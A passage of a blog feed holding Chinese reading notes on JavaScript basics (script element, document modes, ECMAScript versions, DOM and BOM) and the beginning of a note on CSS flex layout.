class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><p>在兼容XHTML的浏览器中，这样能解决问题，但在不支持CDATA块的非XHTML兼容浏览器中则不行，</p><p>所以CDATA比如使用JavaScript注释来抵消：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    //&lt;![CDATA[</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        function compare(a , b)&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            if(a &lt; b)&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                console.log(&quot;a &lt; b&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            &#125;...</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    //]]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这种格式使用于所有现代浏览器，它不仅可以通过XHTML验证，而且对XHTML之前的浏览器也能优雅地降级</p></blockquote><h3 id="2.1.6-废弃的语法">2.1.6 废弃的语法<a title="#2.1.6-废弃的语法" href="#2.1.6-废弃的语法"></a></h3><ul><li><p>type属性使用一个MIME类型字符串来标识<code>&lt;script&gt;</code>的内容，但MIME类型并没有跨浏览器标准化，即使浏览器默认使用JavaScript，在某些情况下某个无效或无法识别的MIME类型也可能导致浏览器跳过（不执行）相关代码。因此，除非你使用XHTML或<code>&lt;script&gt;</code>标签要求或包含非JavaScript代码，最佳做法式不指定type类型。</p></li><li><p>在不支持JavaScript的浏览器（特别是Mosaic）中会把<code>&lt;script&gt;</code>元素的内容输出到页面上，解决方案是把脚本代码块包含在一个HTML注释中</p></li></ul>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="comment">&lt;!--</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">function sayHi()&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">        console.log(&quot;Hi!&quot;);</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">    &#125;</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">//--&gt;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>使用这种格式，Mosaic等浏览器就可以忽略<code>&lt;script&gt;</code>标签中的内容，而支持JavaScript的浏览器则必须识别这种模式，将其中的内容作为JavaScript来解析。</p></blockquote><p>但其实这种格式以及不再必要，而且不应该使用了。在XHTML模式下，这种格式会导致脚本被忽略，因为代码处于有效的XML注释当中。</p></li></ul><h2 id="2.2-行内代码和外部文件">2.2 行内代码和外部文件<a title="#2.2-行内代码和外部文件" href="#2.2-行内代码和外部文件"></a></h2><p>推荐使用外部文件：</p><ul><li>可维护性</li><li>缓存<ul><li>浏览器会根据特定的设置缓存所有外部链接的JavaScript文件</li><li>若两个页面引用到同一个文件，则该文件只需下载一次，意味着页面加载更快</li></ul></li><li>适应未来<ul><li>不必考虑用XHTML或前面提到的注释</li><li>外部JavaScript的语法在HTML和XHTML中是一样的</li></ul></li></ul><p>在初次请求时，如果浏览器支持SPDY/HTTP2，就可以从一个地方取得一批文件，并将它们逐个放到浏览器缓存中。通过SPDY/HTTP2获取所有这些独立的资源与获取一个大JavaScript文件的延迟差不多。</p><p>在第二个页面请求时，由于已经把应用程序切换成了轻量可缓存的文件，第二个页面也依赖的某些组件此时已经存在浏览器缓存中了。</p><h2 id="2.3-文档模式">2.3 文档模式<a title="#2.3-文档模式" href="#2.3-文档模式"></a></h2><p>IE5.5发明了文档模式，即可以使用doctype切换文档；</p><p>最初的文档模式有两种：<strong>混杂模式</strong>和<strong>标准模式</strong></p><blockquote><p>这两种模式的区别只体现在通过CSS渲染的内容方面，对JavaScript也有一些关联影响，或称为副作用。</p></blockquote><p>后来又出现了第3种文档模式：<strong>准标准模式</strong></p><blockquote><p>这种模式下的浏览器支持很多标准的特性，但是没有标准规定的那么严格；</p><p>主要区别在如何对待图片元素周围的空白（在表格中使用图片时最明显）</p></blockquote><ol><li><p><strong>混杂模式</strong>：在所有浏览器中都以省略文档开头的doctype声明作为开关，这种约定不合理，因为混杂模式在不同浏览器中的差异很大，不使用黑科技基本上就没有浏览器一致性可言。</p></li><li><p><strong>标准模式</strong>：通过下列几种文档类型声明开启</p><ul><li><pre><code class="language-html">&lt;!-- HTML 4.01 Strict --&gt;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* ~~~html</span><br><span class="line">  &lt;!-- XHTML 1.0 Strict --&gt;</span><br><span class="line">  &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; </span><br><span class="line">  &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml-strict.dtd&quot;&gt;</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code class="language-html">&lt;!-- HTML5 --&gt;&lt;!DOCTYPE html&gt; <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. **准标准模式**：通过过滤性文档类型（Transitional）和框架集文档类型（Frameset）来触发</span><br><span class="line"></span><br><span class="line">   * ~~~html</span><br><span class="line">     &lt;!-- HTML 4.01 Transitional --&gt;</span><br><span class="line">     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; </span><br><span class="line">     &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code class="language-html">&lt;!-- HTML 4.01 Frameset --&gt;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Frameset//EN&quot; &quot;http://www.w3.org/TR/html4/frameset.dtd&quot;&gt;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* ~~~html</span><br><span class="line">  &lt;!-- XHTML 4.01 Transitional --&gt;</span><br><span class="line">  &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; </span><br><span class="line">  &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml-transitional.dtd&quot;&gt;</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code class="language-html">&lt;!-- XHTML 1.0 Frameset --&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Frameset//EN&quot; &quot;http://www.w3.org/TR/xhtml1/xhtml1-frameset.dtd&quot;&gt;</code></pre></li></ul></li></ol><blockquote><p>准标准模式和标准模式非常接近，很少需要区分，而本书后面所说的标准模式，指的是除混杂模式之外的模式</p></blockquote><h2 id="2.4-&lt;noscript&gt;元素">2.4 <code>&lt;noscript&gt;</code>元素<a title="#2.4-&lt;noscript&gt;元素" href="#2.4-&lt;noscript&gt;元素"></a></h2><p>针对早期浏览器不支持JavaScript的问题，需要一个页面优雅降级的处理方案。</p><p><code>&lt;noscript&gt;</code>元素即用于给不支持JavaScript的浏览器提供替代内容。</p><blockquote><p>虽然先浏览器已经100%支持JavaScript，但对于禁用JavaScript的浏览器来说，这个元素仍然有它的用处</p></blockquote><p><code>&lt;noscript&gt;</code>元素可以包含任何可以出现在<code>&lt;body&gt;</code>中的html元素（除<code>&lt;script&gt;</code>）;</p><p>当满足如下任一条件时，浏览器将显示包含在<code>&lt;noscript&gt;</code>的内容：</p><ul><li>浏览器不支持脚本</li><li>浏览器对脚本的支持被关闭</li></ul><h2 id="2.5-小结">2.5 小结<a title="#2.5-小结" href="#2.5-小结"></a></h2><p>JavaScript是通过<code>&lt;script&gt;</code>元素插入到html页面中的：</p><ul><li>要包含外部JavaScript文件，必须将src属性设置为要包含文件的url。文件可以跟网页在同一台服务器上，也可以位于完全不同的域</li><li>所有<code>&lt;script&gt;</code>元素会依照它们在网页中出现的次序被解释，在不使用<code>defer</code>和<code>async</code>时，包含在<code>&lt;script&gt;</code>的代码必须严格按次序解释</li><li>对不推迟执行的脚本，浏览器必须解释完位于<code>&lt;script&gt;</code>元素的代码，然后才能继续渲染页面的剩余部分。为此，通常把此元素放到页面末尾</li><li>可以使用<code>defer</code>属性把脚本推迟到文档渲染完毕后再执行。推迟脚本的原则上按照次序执行</li><li>可以使用<code>async</code>属性表示不需要等待其他脚本，同时也不阻塞文档渲染，即异步加载。异步脚本不能保证按照次序执行</li><li>通过使用<code>&lt;noscript&gt;</code>元素，可以指定在浏览器不支持脚本时显示的内容。如果浏览器支持，则<code>&lt;noscript&gt;</code>元素中的任何内容都不会被渲染</li></ul>]]></content>
      
      
      <categories>
          
          <category> readNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红宝书 - 第1章 什么是JavaScript</title>
      <link href="/readNotes/1.%E4%BB%80%E4%B9%88%E6%98%AFJavaScript"/>
      <url>/readNotes/1.%E4%BB%80%E4%B9%88%E6%98%AFJavaScript</url>
      
        <content type="html"><![CDATA[<h2 id="1.1-简短的历史回顾">1.1 简短的历史回顾<a title="#1.1-简短的历史回顾" href="#1.1-简短的历史回顾"></a></h2><ul><li><p><font color='blue'>初想法——</font>1995年，网景公司的Brendan Eich的工程师，开始为即将发布的Netscape Navigator2开发一个叫<code>Mocha</code>(后来改名为<code>LiveScript</code>)的脚本语言，当时计划在客户端和服务器端都使用它，在服务端叫<code>LiveWire</code>.</p></li><li><p><font color='blue'>发布1.0——</font>为赶上发布时间，网景与Sun结为开发联盟，共同完成<code>LiveScript</code>的开发，在Netscape Navigator2正式发布前，网景把<code>LiveScript</code> 改名为<code>JavaScript</code>(搭上媒体当时炒作Java的顺风车)</p></li><li><p><font color='blue'>发布1.1、竞争——</font><code>JavaScript1.0</code>很成功，网景又在Netscape Navigator3发布了1.1版本，不久后微软发布了IE3，其中包含自己名为<code>JScript</code>的<code>JavaScript</code>实现</p><blockquote><p>意味着出现了两个版本的<code>JavaScript</code>：Netscape Navigator中的<code>JavaScript</code>、IE中的<code>JScript</code></p></blockquote></li><li><p><font color='blue'>打造标准-&gt;es——</font>1997年，<code>JavaScript</code>作为提案被提交给欧洲计算机制造商协会(Ecma)。第39技术委员会(TC39)承担了“标准化一门通用、跨平台、厂商中立的脚本语言的语法和语义”的任务(参见<code>TC39-ECMAScript</code>)。</p><blockquote><p>TC39委员会由来自网景、Sun、微软、Borland、Nombas和其他对这门脚本语言有兴趣的公司的工程师组成。</p></blockquote><p>他们花了数月打造出ECMA-262，也就是<font color='red'><code>ECMAScript</code></font>这个新的脚本语言标准。</p></li><li><p><font color='blue'>使用es标准——</font>1998年，国际标准化组织（ISO）和国际电工委员会（IEC）也将<code>ECMScript</code>采纳为标准（ISO/IEC-16262），自此以后，各家浏览器均以<code>ECMAScript</code>作为自己<code>JavaScript</code>实现的依据，虽然具体实现各有不同。</p></li></ul><h2 id="1.2-javascript实现">1.2 JavaScript实现<a title="#1.2-javascript实现" href="#1.2-javascript实现"></a></h2><blockquote><p>虽然<code>JavaScript</code>和<code>ECMAScript</code>基本上是同义词，但<code>JavaScript</code>远远不限于<code>ECMA-262</code>所定义的那样</p></blockquote><p>完整的<code>JavaScript</code>实现包括：</p><ol><li><font color='red'>核心（ECMAScript）</font></li><li><font color='red'>文档对象模型（DOM）</font></li><li><font color='red'>浏览器对象模型（BOM）</font></li></ol><h3 id="1.2.1-ecmascript">1.2.1 ECMAScript<a title="#1.2.1-ecmascript" href="#1.2.1-ecmascript"></a></h3><p><strong>定义：</strong><code>ECMAScript</code>，即<code>ECMA-262</code>定义的语言，并不局限Web浏览器。</p><blockquote><ul><li><p>这门语言没有输入输出之类的方法。</p></li><li><p><code>ECMA-262</code>将这门语言作为一个基准来定义，以便在它之上再构建更稳健的脚本语言。</p></li><li><p>Web浏览器只是<code>ECMAScript</code>实现可能存在的一种<strong>宿主环境</strong></p></li><li><p>宿主环境提供<code>ECMAScript</code>的基准实现和与环境自身交互必需的扩展</p></li><li><p>扩展（比如DOM）使用<code>ECMAScript</code>核心类型和语法，提供特定的于环境的额外功能。</p></li><li><p>其他宿主环境还有服务器端JavaScript平台Node.js和即将被淘汰的Adobe Flash</p></li></ul></blockquote><p>不涉及浏览器的话，ECMA-262的定义:(在基本的层面，它描述这门语言的部分：)</p><ul><li>语法</li><li>类型</li><li>语句</li><li>关键字</li><li>保留字</li><li>操作符</li><li>全局对象</li></ul><p><code>ECMAScript</code>只是对实现这个规范描述的所有方面的一门语言的称呼。</p><h4 id="1.ecmascript版本">1.ECMAScript版本<a title="#1.ecmascript版本" href="#1.ecmascript版本"></a></h4><p>ECMAScript不同的版本以‘edition’表示（也就是描述特定实现的ECMA-262的版本），最近的版本是第10版，发布于2019年06月。</p><ol><li><p>ECMA-262第1版：本质上与网景的JavaScript1.1相同，只不过删除了所有浏览器特定的代码，外加少量细微的修改</p><blockquote><p>ECMA-262要求支持Unicode标准，以支持多语言，而且对象要与平台无关。但Netscape JavaScript1.1的对象不是这样的，比如Date对象就依赖平台。这也是JavaScript1.1和JavaScript1.2不符合ECMA-262第1版的原因</p></blockquote></li><li><p>ECMA-262第2版：做了一些编校工作，主要是为了更新之后严格符合ISO/IEC-16262的要求，并没有增减或改变任何特性</p><blockquote><p>ECMAScript实现通常不使用第2版来衡量符合性</p></blockquote></li><li><p>ECMA-262第3版：第一次真正对这个标准进行更新，更新了字符串处理、错误定义和数值输出，还增加了对正则表达式、新的控制语句、try/catch异常处理的支持，以及为了更好地让国际化所做的少量修改</p></li><li><p>ECMA-262第4版：是对这门语言的一次彻底修订。Ecma39再次被召集起来，几乎在第3版的基础上完全定义了一门新语言。包括强类型变量、新语句、数据结构、真正的类、经典的继承、操作数据的新手段。因为跳跃太大，所以在正式发布前就被放弃了</p></li><li><p>ECMA-262第5版：Ecma39在研究第4版的同时也提出了‘ECMAScript3.1’，只对这门语言进行较少的改进，只要在现有JavaScript引擎基础上做一些增改就可以实现，最终ES3.1变成了ECMA-262的第5版，其致力于厘清第3版存在的歧义，也增加了新功能。包括<strong>原生的解析</strong>和<strong>序列化JOSN数据的json对象</strong>、<strong>方便继承和高级属性定义的方法</strong>、<strong>新的增强ECMAScript引擎解释</strong>和<strong>执行代码能力的严格模式</strong></p></li><li><p>ECMA-262第6版：ES6、ES2015、ES Harmony（和谐版），于2015年6月发布。这一版包含了大概这个规范有史以来最重要的一批增强特性。ES6正式支持了<strong>类</strong>、<strong>模块</strong>、<strong>迭代器</strong>、<strong>生成器</strong>、<strong>箭头函数</strong>、<strong>期约</strong>、<strong>反射</strong>、<strong>代理</strong>和<strong>众多新的数据类型</strong>。</p></li><li><p>ECMA-262第7版：ES7、ES2016，于2016年6月发布，这次修订只包含少量语法层面的增强，如<strong>Array.proptotype.includes</strong>和**指数操作符****.</p></li><li><p>ECMA-262第8版：ES8、ES2017，完成于2017年6月，这一版主要增加了<strong>异步函数</strong>(async/await)、<strong>SharedArrayBuffer</strong>及<strong>Atomics API</strong>，以及Objec<strong>t.values() / Object.entries() / Object.getOwnPropertyDescriptors()</strong> 和<strong>字符串填充方法</strong>，另外明确<strong>支持对象字面量最后的逗号</strong>。</p></li><li><p>ECMA-262第9版：ES9、ES2018，发布于2018年6月，这次修订包括<strong>异步迭代</strong>、<strong>剩余和扩展属性</strong>、<strong>一组新的正则表达式特性</strong>、<strong>Promise finally()</strong>，以及<strong>模板字面量修改</strong>。</p></li><li><p>ECMA-262第10版：ES10、ES2019，发布于2019年6月，这次修订增加了<strong>Array.prototype.flat() / flatMap()</strong> 、 <strong>String.prototype.trimStart() / trimEnd()</strong> <strong>、Object.fromEntries() 方法</strong>，以及<strong>Symbol.prototype.description属性</strong>，<strong>明确定义了Function.prototype.toString() 的返回值值并固定了Array.prototype.sort() 的顺序</strong>。解决了<strong>JSON字符串兼容的问题</strong>，并<strong>定义了catch子句的可选绑定</strong>。</p></li></ol><h4 id="2.ecmascript符合性是什么意思">2.ECMAScript符合性是什么意思<a title="#2.ecmascript符合性是什么意思" href="#2.ecmascript符合性是什么意思"></a></h4><p>ECMA-262阐述了什么是ECMAScript符合性，要成为ECMAScript实现，必须满足：</p><ol><li>支持ECMA-262中描述的所有“类型、值、对象、属性、函数，以及程序语法与语义”；</li><li>支持Unicode字符标准</li></ol><p>此外，符合性实现还可以满足下列要求：</p><ol><li>增加ECMA-262中未提及的“额外的类型、值、对象、属性和函数”。ECMA-262所说的这些额外内容主要指规范中未给出的新对象或对象的新属性</li><li>支持ECMA-262中，没有定义的“程序和正则表达式语法”(允许修改和扩展内置的正则表达式特性)</li></ol><h4 id="3.-浏览器对ecmascript的支持">3. 浏览器对ECMAScript的支持<a title="#3.-浏览器对ecmascript的支持" href="#3.-浏览器对ecmascript的支持"></a></h4><div class="φbq"><div class="φbs"><table><thead><tr><th>浏览器</th><th>ECMAScript符合性</th></tr></thead><tbody><tr><td>Netscape Navigator2</td><td>—</td></tr><tr><td>Netscape Navigator3</td><td>—</td></tr><tr><td>Netscape Navigator4~4.05</td><td>—</td></tr><tr><td>Netscape Navigator4.06~4.79</td><td>第1版</td></tr><tr><td>Netscape 6+（Mozilla 0.6.0+）</td><td>第3版</td></tr><tr><td>IE3~4</td><td>—</td></tr><tr><td>IE5</td><td>第1版</td></tr><tr><td>IE5.5~8</td><td>第3版</td></tr><tr><td>IE9</td><td>第5版（部分）</td></tr><tr><td>IE10~11</td><td>第5版</td></tr><tr><td>Edge12+</td><td>第6版</td></tr><tr><td>Opera6~7.1</td><td>2</td></tr><tr><td>Opera7.2+</td><td>3</td></tr><tr><td>Opera15~28</td><td>5</td></tr><tr><td>Opera29~35</td><td>6（部分）</td></tr><tr><td>Opera36+</td><td>6</td></tr><tr><td>Safari1~2.0.x</td><td>第3版（部分）</td></tr><tr><td>Safari3.1~5.1</td><td>第5版（部分）</td></tr><tr><td>Safari6~8</td><td>第5版</td></tr><tr><td>Safari9+</td><td>第6版</td></tr><tr><td>iOS Safari3.2~5.1</td><td>5（部分）</td></tr><tr><td>iOS Safari6~8.4</td><td>5</td></tr><tr><td>iOS Safari9.2+</td><td>6</td></tr><tr><td>Chrome1~3</td><td>第3版</td></tr><tr><td>Chrome4~22</td><td>第5版（部分）</td></tr><tr><td>Chrome23+</td><td>第5版</td></tr><tr><td>Chrome42~48</td><td>第6版（部分）</td></tr><tr><td>Chrome79+</td><td>第6版</td></tr><tr><td>Firefox1~2</td><td>3</td></tr><tr><td>Firefox3.0.x~20</td><td>5（部分）</td></tr><tr><td>Firefox21~44</td><td>5</td></tr><tr><td>Firefox45+</td><td>6</td></tr></tbody></table></div></div><h3 id="1.2.2-dom">1.2.2 DOM<a title="#1.2.2-dom" href="#1.2.2-dom"></a></h3><p><strong>文档对象模型</strong>（DOM，Document Object Model）是一个应用程序接口（API），用于在HTML中使用扩展的XML。DOM将整个页面抽象为一组分层节点。HTML或XML页面的每个组成部分都是一种节点，包含不同的数据。</p><blockquote><p>DOM通过创建表示文档的树，让开发者可以随心所欲地控制网页的内容和结构。使用DOM API，可以轻松的删除、添加、替换、修改节点。</p></blockquote><h4 id="1.为什么dom是必需的">1.为什么DOM是必需的<a title="#1.为什么dom是必需的" href="#1.为什么dom是必需的"></a></h4><p>在IE4和Netscape Navigator4支持不同形式的动态HTML（DHTML）的情况下，开发者首先可以做到不刷新页面而修改页面外观和内容。为了保持Web跨平台性，万维网联盟（W3C，World Wide Web Consortium）开始制定DOM标准的进程。</p><h4 id="2.dom级别">2.DOM级别<a title="#2.dom级别" href="#2.dom级别"></a></h4><ol><li>1998年10月，<strong>DOM Level 1</strong> 成为W3C的推荐标准。由以下两个模块组成：</li></ol><ul><li>DOM Core  ： 映射XML文档，从而方便访问和操作文档任意部分的方式</li><li>DOM HTML  ：扩展了Core，并增加了特定于HTML的对象和方法</li></ul><ol start="2"><li>DOM Level 1 的目标是映射文档结构，而<strong>DOM Level 2</strong>的目标则宽泛得多。对最初DOM的扩展增加了<u>对（DHTML早就支持的）鼠标和用户界面事件、范围、遍历的支持</u>，而且<u>通过对象接口支持了层叠样式表CSS</u>。DOM Level 1 中的DOM Core也<u>被扩展以包含对XML命名空间的支持</u>。</li></ol><p>​       DOM Level 2新增了以下模块，以支持新的接口</p><ul><li>DOM视图：描述追踪文档不同视图（如应用CSS样式前后的文档）的接口</li><li>DOM事件：描述事件及事件处理接口</li><li>DOM样式：描述处理元素CSS样式的接口</li><li>DOM遍历和范围：描述遍历和操作DOM树的接口</li></ul><ol start="3"><li><strong>DOM Level 3</strong>进一步扩展了DOM，增加了以统一的方式加载和保存文档的方法（包含在一个叫DOM Load and Save的新模块中），还有验证文档的方法（DOM Validation）。在Level3中，DOM Core经过扩展支持了所有XML1.0的特性，包括XML Infoset、XPath 和 XML Base</li><li>目前，W3C不再按照Level来维护DOM了，而是作为DOM Living Standard来维护，其快照称为DOM4，DOM4新增的内容包括替代Mutation Events的Mutation Observers</li></ol><h4 id="3.其他dom">3.其他DOM<a title="#3.其他dom" href="#3.其他dom"></a></h4><blockquote><p>除了DOM Core和DOM HTML接口，有些其他语言也发布了自己的DOM标准。</p></blockquote><p>以下语言均基于XML，每一种都增加了该语言独有的DOM方法和接口：</p><p>W3C推荐标准：</p><ul><li>可伸缩矢量图（SVG，Scalable Vector Graphics）</li><li>数学标记语言（MathML，Mathematical Markup Language）</li><li>同步多媒体集成语言（SMIL，Synchronization Multimedia Integration Language）</li></ul><p>非W3C推荐的标准：</p><ul><li>Mozilla的XML用户界面语言（XUL，XML　User　Interface　Language）</li></ul><h4 id="４.web浏览器对dom的支持情况">４.Web浏览器对DOM的支持情况<a title="#４.web浏览器对dom的支持情况" href="#４.web浏览器对dom的支持情况"></a></h4><div class="φbq"><div class="φbs"><table><thead><tr><th>浏览器</th><th>DOM兼容</th></tr></thead><tbody><tr><td>Netscape Navigator１～４.ｘ</td><td>—</td></tr><tr><td>Netscape 6+（Mozilla 0.6.0+）</td><td>Level１、Level２（几乎全部）、Level３（部分）</td></tr><tr><td>IE２～4.ｘ</td><td>—</td></tr><tr><td>IE5</td><td>Level１（很少）</td></tr><tr><td>IE5.5~8</td><td>Level１（几乎全部）</td></tr><tr><td>IE９＋</td><td>Level１、Level２、Level３</td></tr><tr><td>Edge</td><td>Level１、Level２、Level３</td></tr><tr><td>Opera１～６</td><td>—</td></tr><tr><td>Opera7～８.ｘ</td><td>Level１（几乎全部）、Level２（部分）</td></tr><tr><td>Opera９～９.９</td><td>Level１、Level２（几乎全部）、Level３（部分）</td></tr><tr><td>Opera１０＋</td><td>Level１、Level２、Level３（部分）</td></tr><tr><td>Safari１.０.ｘ</td><td>Level１</td></tr><tr><td>Safari２＋</td><td>Level１、Level２（全部）、Level３（部分）</td></tr><tr><td>iOS Safari3.２＋</td><td>Level１、Level２（全部）、Level３（部分）</td></tr><tr><td>Chrome1＋</td><td>Level１、Level２（全部）、Level３（部分）</td></tr><tr><td>Firefox1＋</td><td>Level１、Level２（几乎全部）、Level３（部分）</td></tr></tbody></table></div></div><h3 id="1.2.3-bom">1.2.3 BOM<a title="#1.2.3-bom" href="#1.2.3-bom"></a></h3><p><strong>浏览器对象模型</strong>（BOM）API，用于支持访问和操作浏览器的窗口。</p><blockquote><p>它是唯一一个没有相关标准的JavaScript实现。后来html5以正式规范的形式涵盖了尽可能多的DOM特性</p></blockquote><p>BOM主要针对浏览器窗口和子窗口（frame），通常人们会把任何特定于浏览器的扩展都归在BOM的范畴内，下面就是这样一些扩展：</p><ul><li>弹出新浏览器窗口的能力</li><li>移动、缩放和关闭浏览器窗口的能力</li><li>navigator对象，提供关于浏览器的详尽信息</li><li>location对象，提供浏览器加载页面的详尽信息</li><li>screen对象，提供关于用户屏幕分辨率的详尽信息</li><li>performance对象，提供浏览器内存占用，导航行为和事件统计的详尽信息</li><li>对cookie的支持</li><li>其他自定义对象，如XMLHttpRequest和IE的ActiveXObject</li></ul><h2 id="1.3-javascript版本">1.3 JavaScript版本<a title="#1.3-javascript版本" href="#1.3-javascript版本"></a></h2><div class="φbq"><div class="φbs"><table><thead><tr><th>浏览器</th><th>JavaScript版本</th></tr></thead><tbody><tr><td>Netscape Navigator2</td><td>1.0</td></tr><tr><td>Netscape Navigator3</td><td>1.1</td></tr><tr><td>Netscape Navigator4</td><td>1.2</td></tr><tr><td>Netscape Navigator4.06</td><td>1.3</td></tr><tr><td>Navigator6+（Mozilla0.6.0+）</td><td>1.5</td></tr><tr><td>Firefox1</td><td>1.5</td></tr><tr><td>Firefox1.5</td><td>1.6</td></tr><tr><td>Firefox2</td><td>1.7</td></tr><tr><td>Firefox3</td><td>1.8</td></tr><tr><td>Firefox3.5</td><td>1.8.1</td></tr><tr><td>Firefox3.6</td><td>1.8.2</td></tr><tr><td>Firefox4</td><td>1.8.5</td></tr></tbody></table></div></div><blockquote><p>Netscape/Mozilla仍然沿用这种版本方案，而IE的JScript有不同的版本号规则</p><p>多数浏览器对JavaScript的支持，指的是实现ECMAScript和DOM的程度</p></blockquote><h2 id="1.4-小结">1.4 小结<a title="#1.4-小结" href="#1.4-小结"></a></h2><p>JavaScript是一门用来于网页交互的脚本语言，包含以下三个组成部分：</p><ul><li>ECMAScript</li><li>DOM</li><li>BOM</li></ul><p>JavaScript的这三个部分得到了五大web浏览器（IE、Firefox、Chrome、Safari和Opera）不同程度的支持；</p><p>所有浏览器基本上对ES5提供了完善的支持，对ES6和ES7的支持度也在不断提升；</p><p>这些浏览器对DOM的支持各不相同，但对Level3的支持日益趋于规范；</p><p>HTML5中收录的BOM会因浏览器而异，不过开发者可以假定存在很大一部分公共特性</p>]]></content>
      
      
      <categories>
          
          <category> readNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flex 布局</title>
      <link href="/learningNotes/further/flex"/>
      <url>/learningNotes/further/flex</url>
      
        <content type="html"><![CDATA[<h4 id="flex-布局是什么">flex 布局是什么<a title="#flex-布局是什么" href="#flex-布局是什么"></a></h4><p>Flex 是 Flexible Box 的缩写，意为&quot;弹性布局&quot;，用来为盒状模型提供最大的灵活性。</p><p>任何一个容器都可以指定为 Flex 布局。<code>display: flex;</code></p><p>行内元素也可以使用 Flex 布局。<code>display: inline-flex;</code></p><p>Webkit 内核的浏览器，必须加上<code>-webkit</code>前缀。<code>display: -webkit-flex; display: flex;</code></p><blockquote><p>注：设为 Flex 布局以后，子元素的<code>float</code>、<code>clear</code>和<code>vertical-align</code>属性将失效。</p></blockquote><p>​</p><h4 id="基本概念">基本概念<a title="#基本概念" href="#基本概念"></a></h4><p>采用 Flex 布局的元素，称为 <strong>Flex 容器</strong>（flex container），简称&quot;容器&quot;。它的所有子元素自动成为容器成员，称为 <strong>Flex 项目</strong>（flex item），简称&quot;项目&quot;。</p><h4 id="容器的属性">容器的属性<a title="#容器的属性" href="#容器的属性"></a></h4><ul><li><p>flex-direction：决定主轴的方向（即项目的排列方向）</p><p><code>row 默 | row-reverse | column | column-reverse;</code></p></li><li><p>flex-wrap：定义,一条轴线排不下，如何换行</p><p><code>nowrap 默 | wrap | wrap-reverse;</code></p></li><li><p>flex-flow：是<code>flex-direction</code>属性和<code>flex-wrap</code>属性的简写形式</p></li><li><p>justify-content：定义了项目在主轴上的对齐方式</p><p><code>flex-start 默 | flex-end | center | space-between | space-around;</code></p></li><li><p>align-items：定义项目在交叉轴上如何对齐</p><p><code>flex-start  | flex-end | center | baseline | stretch 默 </code></p></li><li><p>align-content：定义了多根轴线的对齐方式，如果项目只有一根轴线，不起作用</p><p><code>flex-start | flex-end | center | space-between | space-around | stretch 默</code></p></li></ul><h4 id="项目的属性">项目的属性<a title="#项目的属性" href="#项目的属性"></a></h4><ul><li><p><code>order</code>：定义项目的排列顺序。数值越小，排列越靠前，默认为0</p></li><li><p><code>flex-grow</code>：项目的放大比例，默认为0，即如果存在剩余空间，也不放大</p></li><li><p><code>flex-shrink</code>：性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小</p></li><li><p><code>flex-basis</code>：在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为<code>auto</code>，即项目的本来大小。</p><p><code>&lt;length&gt; | auto 